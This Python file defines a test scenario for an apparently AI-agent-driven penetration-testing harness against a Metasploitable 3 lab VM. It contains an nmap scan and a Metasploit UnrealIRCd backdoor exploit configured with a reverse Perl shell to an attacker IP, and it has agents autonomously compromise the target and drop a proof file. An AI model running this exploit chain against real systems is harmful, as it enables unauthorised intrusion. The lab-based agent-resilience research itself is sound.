"""
Example Attack Graph: ORPHAN-C — capability loss before IMPACT (MS3).

Same capability-loss injection as orphan-A, but the orphaned objective is an
IMPACT step (write a proof-of-compromise file and read it back), NOT privilege
escalation. This is deliberate: the recovery metric should measure the GRAFT, and
an impact write+read-back grounds DETERMINISTICALLY on any live shell — whereas
privesc-to-root depends on a flaky kernel/docker exploit, which would entangle
"did the graft work?" with "did privesc get lucky?". orphan-C isolates the graft.

Chain: recon -> gain_access (opens a session) -> file_drop (impact objective).
Injection: the harness destroys the session obtained at gain_access BEFORE the
impact node runs, so the objective can only be reached by re-provisioning a fresh
session (graft) and re-parenting the impact node onto it.

The impact node is GOAL-ONLY (no prescribed commands) so it dispatches to the
impact subagent, whose _find_live_impact_session resolver runs on the FRESH grafted
session (not the dead original). Grounding = the written marker is read back off
the target (parse_eval._impact_grounded), which a live shell achieves reliably.

Run with explore=True so the graft is active.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)

KILL_BEFORE_NODE = "file_drop"        # session is killed right before this runs
CAPABILITY_PROVIDER = "gain_access"    # the node that opened the session (kappa in H)
PROOF_MARKER = "PWNED_ORPHAN_C_a7f3"   # stable literal to write then read back
PROOF_FILE = "/tmp/pwned_orphan_c.txt"


def build_orphan_c_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the UnrealIRCd "
                  "3.2.8.1 backdoor on port 6667, then drop a verified "
                  "proof-of-compromise file. (This is the orphan-C capability-loss "
                  "scenario: the session obtained at initial access is destroyed "
                  "externally before the impact step runs, so the objective can only "
                  "be reached by re-provisioning a fresh session and re-parenting the "
                  "impact step onto it.)",
        target_ip=target_ip,
        name=f"orphan_c_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Capability-loss (orphan) scenario with a DETERMINISTIC impact "
                    "objective: the access session is killed externally before "
                    "impact — exercises the graft, isolated from privesc luck.",
        metadata={
            "scenario": "orphan_c",
            "target_type": "metasploitable3",
            "injection": {
                "type": "capability_loss",
                "capability": "session",
                "kill_before_node": KILL_BEFORE_NODE,
                "provided_by_node": CAPABILITY_PROVIDER,
                "stage": "impact",
            },
        },
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Discover Attack Surface",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's open services and versions",
        objective=f"Discover open ports, services and versions on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -Pn -sV --top-ports 1000 -T4 {target_ip}"],
        max_retries=2,
        tags=["recon"],
    ))

    # WORKING proven lander: UnrealIRCd 3.2.8.1 backdoor on 6667 -> command shell.
    # Establishes the session capability that the harness later destroys.
    graph.add_node(AttackNode(
        id="gain_access",
        label="Gain Initial Access (UnrealIRCd backdoor)",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Open a command shell session on the target",
        objective=f"Gain an initial command shell on {target_ip} via the "
                  f"UnrealIRCd 3.2.8.1 backdoor on port 6667. LHOST={attacker_ip}.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/irc/unreal_ircd_3281_backdoor",
        module_options={"RHOSTS": target_ip, "RPORT": 6667},
        payload="cmd/unix/reverse_perl",
        payload_options={"LHOST": attacker_ip, "LPORT": 4464},
        max_retries=3,
        tags=["initial_access", "unrealircd", "backdoor"],
    ))

    # THE OBJECTIVE: a deterministic impact. GOAL-ONLY (no commands_to_run) so it
    # dispatches to the impact subagent, which resolves the FRESH grafted session and
    # writes+reads-back the proof marker. Grounds on the marker read-back.
    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written, verified artifact",
        objective=(f"Write the exact marker '{PROOF_MARKER}' to {PROOF_FILE} on the "
                   f"target via the session, then read {PROOF_FILE} back to verify the "
                   f"write succeeded. The marker must appear in the read-back output."),
        target_ip=target_ip,
        tool_name="session",
        max_retries=3,
        metadata={"target_file": PROOF_FILE, "marker": PROOF_MARKER},
        tags=["impact", "file_drop", "proof", "objective"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "gain_access",
        checks=[EdgeCheck(field="success", operator="equals", expected="True",
                          description="Recon produced usable service data")],
        evidence="Recon mapped the attack surface",
        rationale="Attempt initial access via the UnrealIRCd backdoor",
    )
    # Carries the SESSION capability from gain_access to file_drop. When the harness
    # destroys the session, file_drop's precondition is no longer held -> orphaning.
    graph.connect(
        "gain_access", "file_drop",
        checks=[EdgeCheck(field="session_id", operator="exists",
                          description="A live session is required to drop the file")],
        evidence="Initial session established",
        rationale="Drop the proof-of-compromise file over the session",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_orphan_c_graph(target_ip="192.168.34.7", attacker_ip="192.168.34.6")
    print(graph.summary())
    print()
    out_path = "examples/orphan_c_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")
    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
